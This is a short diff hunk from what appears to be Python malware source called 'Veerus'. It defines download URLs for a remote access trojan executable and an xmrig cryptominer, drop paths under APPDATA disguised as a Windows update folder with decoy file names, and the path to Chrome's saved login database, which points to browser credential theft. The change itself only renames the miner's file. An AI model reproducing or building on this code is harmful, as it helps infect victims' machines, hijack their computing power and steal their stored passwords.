@@ -135,7 +135,7 @@ RATURL = "https://github.com/0xSxZ/Veerus/releases/download/dont/r4t.exe"
 MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
 rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\667.exe"
-XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
+XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\667v2.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
